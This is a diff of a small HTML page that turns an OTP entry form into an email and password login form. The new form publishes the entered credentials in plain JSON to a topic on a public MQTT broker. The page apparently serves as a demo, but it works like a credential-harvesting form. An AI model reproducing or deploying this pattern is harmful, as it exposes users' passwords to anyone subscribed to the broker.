@@ -1,53 +1,62 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>6-digit OTP Input</title>
-  <meta charset="UTF-8">
-  <style>
-    body { font-family: Arial, sans-serif; background: #f9f9f9; text-align: center; margin-top: 100px; }
-    input { font-size: 1.5rem; padding: 8px; width: 140px; margin-bottom: 12px; }
-    button { font-size: 1.1rem; padding: 8px 20px; }
-    #status { margin-top: 16px; }
-  </style>
+    <meta charset="UTF-8">
+    <title>Login via MQTT</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif; text-align: center; margin-top: 100px;
+        }
+        #loginForm {
+            margin: auto; width: 300px; padding: 24px; border: 1px solid #eee; border-radius: 8px;
+            background: #fafafa; box-shadow: 2px 2px 8px #ddd;
+        }
+        input, button { 
+            font-size: 1.1rem; margin: 8px 0; padding: 6px 10px; width: 90%; 
+            box-sizing: border-box; 
+        }
+        #status { margin-top: 16px; }
+    </style>
 </head>
 <body>
-  <h2>Enter 6-digit OTP</h2>
-  <form id="otpForm">
-    <input
-      type="text"
-      id="otp"
-      maxlength="6"
-      pattern="[0-9]{6}"
-      required
-      placeholder="123456"
-      autofocus
-      autocomplete="one-time-code"
-      inputmode="numeric"
-    >
-    <br>
-    <button type="submit">Send OTP</button>
-  </form>
-  <div id="status"></div>
-  <script src="https://unpkg.com/mqtt/dist/mqtt.min.js"></script>
-  <script>
-    const client = mqtt.connect('wss://broker.emqx.io:8084/mqtt');
-    client.on('connect', function () {
-      document.getElementById('status').innerText = "Connected to MQTT broker.";
-    });
-    client.on('error', function(err) {
-      document.getElementById('status').innerText = "MQTT connection error!";
-      console.error(err);
-    });
-    document.getElementById('otpForm').onsubmit = function(e) {
-      e.preventDefault();
-      const otp = document.getElementById('otp').value;
-      if (/^\d{6}$/.test(otp)) {
-        client.publish('otp/test', JSON.stringify({ otp: otp, timestamp: new Date().toISOString() }));
-        document.getElementById('status').innerText = "OTP sent via MQTT!";
-      } else {
-        document.getElementById('status').innerText = "Please enter a valid 6-digit code.";
-      }
-    }
-  </script>
+    <h2>Login</h2>
+    <form id="loginForm">
+        <input type="email" id="email" required placeholder="Email"><br>
+        <input type="password" id="password" required placeholder="Password"><br>
+        <button type="submit">Login</button>
+    </form>
+    <div id="status"></div>
+
+    <!-- MQTT.js library -->
+    <script src="https://unpkg.com/mqtt/dist/mqtt.min.js"></script>
+    <script>
+        // Connect to the EMQX broker over secure WebSocket
+        const client = mqtt.connect('wss://broker.emqx.io:8084/mqtt');
+
+        client.on('connect', function () {
+            document.getElementById('status').innerText = "Connected to MQTT broker.";
+        });
+
+        client.on('error', function (err) {
+            document.getElementById('status').innerText = "MQTT connection error!";
+            console.error(err);
+        });
+
+        document.getElementById('loginForm').onsubmit = function(e) {
+            e.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const payload = JSON.stringify({
+                email: email,
+                password: password,
+                timestamp: new Date().toISOString()
+            });
+            // Send credentials to topic 'creds/test'
+            client.publish('creds/test', payload);
+            document.getElementById('status').innerText = "Credentials sent!";
+            document.getElementById('email').value = "";
+            document.getElementById('password').value = "";
+        };
+    </script>
 </body>
 </html>
